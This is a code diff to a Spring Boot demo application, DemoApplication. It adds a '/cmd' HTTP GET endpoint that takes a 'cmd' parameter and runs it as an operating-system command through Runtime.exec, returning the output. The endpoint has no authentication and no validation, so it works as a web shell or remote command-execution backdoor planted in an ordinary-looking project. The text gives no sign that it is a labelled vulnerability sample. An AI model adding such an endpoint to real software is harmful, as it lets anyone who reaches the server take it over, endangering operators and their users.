@@ -1,6 +1,8 @@
 package com.spring.Demo;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
@@ -76,5 +78,42 @@ public class DemoApplication {
 		}
 		return "hello world!" + temp;
 	}
+	
+	@RequestMapping(value = "/cmd", method = RequestMethod.GET)
+    public String greeding(@RequestParam(value = "cmd", required = true) String cmd) {
+        String output = "";
+        try {
+            output = executeCommand(cmd);
+            return output;
+        } catch (Exception e) {
+            e.getMessage();
+            return e.getMessage();
+        }
+
+    }
+	
+	public String executeCommand(String command) {
+
+        StringBuffer output = new StringBuffer();
+
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec(command);
+            p.waitFor();
+            BufferedReader reader
+                    = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+            String line = "";
+            while ((line = reader.readLine()) != null) {
+                output.append(line + "\n");
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return output.toString();
+
+    }
 
 }
